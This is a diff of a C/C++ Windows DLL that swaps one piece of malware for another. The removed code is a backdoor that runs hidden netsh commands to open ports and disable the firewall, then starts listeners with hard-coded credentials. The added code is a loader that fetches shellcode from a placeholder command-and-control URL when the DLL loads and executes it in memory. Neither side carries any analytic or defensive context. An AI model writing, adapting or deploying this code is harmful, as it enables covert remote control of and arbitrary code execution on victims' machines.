@@ -1,145 +1,48 @@
-#include "main.h"
-#include "backdoor.h"
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <windows.h>
+#include <wininet.h>
+// Link with wininet.lib
 
-#define USERNAME "admin"
-#define PASSWORD "admin4999660"
+// Download payload directly into memory
+LPVOID DownloadPayload(LPCSTR url, DWORD* outSize) {
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return NULL;
 
-int gl_Listen_Ports[] = {7437, 74, 43, 37, 743, 437, 17437, 0};
+    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hFile) { InternetCloseHandle(hInternet); return NULL; }
 
-typedef struct _Thread_Param_
-{
-    char username[100];
-    char password[100];
-    int port;
-} THREAD_PARAM;
+    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, 4096 * 1024, MEM_COMMIT, PAGE_READWRITE); // up to 4MB
+    DWORD totalRead = 0, bytesRead = 0;
+    while (InternetReadFile(hFile, buffer + totalRead, 4096, &bytesRead) && bytesRead)
+        totalRead += bytesRead;
 
-DWORD WINAPI listener_thread(LPVOID param)
-{
-    THREAD_PARAM listenParam = *(THREAD_PARAM *)param;
-
-    free(param);
-    start_service(listenParam.username, listenParam.password, listenParam.port);
-
-    return 0;
+    InternetCloseHandle(hFile); InternetCloseHandle(hInternet);
+    if (outSize) *outSize = totalRead;
+    return buffer;
 }
 
-static int _exec_cmd(char *pCmd)
-{
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    char cmd[2048];
-
-    memset(&si, 0x00, sizeof(si));
-    memset(&pi, 0x00, sizeof(pi));
-    memset(cmd, 0x00, sizeof(cmd));
-
-    sprintf(cmd, "cmd.exe /c %s", pCmd);
-
-    si.cb=sizeof(STARTUPINFO);
-    si.dwFlags=STARTF_USESHOWWINDOW;
-    si.wShowWindow=SW_HIDE;
-    if(CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) != 0)
-    {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-    else
-    {
-        return -1;
-    }
-
-    return 0;
+// Execute shellcode in memory
+void ExecutePayload(LPVOID buffer, DWORD size) {
+    DWORD oldProtect;
+    VirtualProtect(buffer, size, PAGE_EXECUTE_READ, &oldProtect);
+    ((void(*)())buffer)();
 }
 
-int start_backdoor()
-{
-    HANDLE hThread = NULL;
-    int idx = 0;
-    int succCount = 0;
-    THREAD_PARAM *pThreadParam = NULL;
-    char selfFullPath[MAX_PATH];
-    char cmd[1024];
-
-    memset(selfFullPath, 0x00, sizeof(selfFullPath));
-    memset(cmd, 0x00, sizeof(cmd));
-
-    if(GetModuleFileName(NULL, selfFullPath, sizeof(selfFullPath) - 1) != 0)
-    {
-        //���ӽ��̷�������
-        sprintf(cmd, "netsh firewall set allowedprogram \"%s\" A ENABLE", selfFullPath);
-        _exec_cmd(cmd);
-    }
-
-    for(idx = 0, succCount = 0; gl_Listen_Ports[idx] > 0; ++idx)
-    {
-        pThreadParam = (THREAD_PARAM *)malloc(sizeof(THREAD_PARAM));
-        if(pThreadParam == NULL)
-            continue;
-
-        //���Ӷ˿ڷ�������
-        memset(cmd, 0x00, sizeof(cmd));
-        sprintf(cmd, "netsh firewall set portopening TCP %d ENABLE", gl_Listen_Ports[idx]);
-        _exec_cmd(cmd);
-
-        memset(pThreadParam, 0x00, sizeof(THREAD_PARAM));
-        strcat(pThreadParam->username, USERNAME);
-        strcat(pThreadParam->password, PASSWORD);
-        pThreadParam->port = gl_Listen_Ports[idx];
-
-        hThread = CreateThread(NULL, 0, listener_thread, (LPVOID)pThreadParam, 0, NULL);
-        CloseHandle(hThread);
-        ++succCount;
-    }
-
-    //���÷���ǽ
-    memset(cmd, 0x00, sizeof(cmd));
-    strcat(cmd, "netsh firewall set opmode mode=disable");
-    _exec_cmd(cmd);
-
-    if(succCount > 0)
-    {
-        while(1)
-        {
-            Sleep(100);
+// DllMain Entry
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH: {
+            DWORD payloadSize = 0;
+            LPVOID payload = DownloadPayload("https://your-c2-server/payload.bin", &payloadSize);
+            if (payload && payloadSize > 0) {
+                ExecutePayload(payload, payloadSize);
+                VirtualFree(payload, 0, MEM_RELEASE);
+            }
+            break;
         }
+        case DLL_PROCESS_DETACH:
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+            break;
     }
-
-    return succCount;
-}
-
-extern "C" int DLL_EXPORT main()
-{
-    return start_backdoor();
-}
-
-extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
-{
-
-
-    switch (fdwReason)
-    {
-    case DLL_PROCESS_ATTACH:
-        // attach to process
-        // return FALSE to fail DLL load
-        main();
-        break;
-
-    case DLL_PROCESS_DETACH:
-        // detach from process
-        break;
-
-    case DLL_THREAD_ATTACH:
-        // attach to thread
-        break;
-
-    case DLL_THREAD_DETACH:
-        // detach from thread
-        break;
-    }
-    return TRUE; // succesful
+    return TRUE;
 }
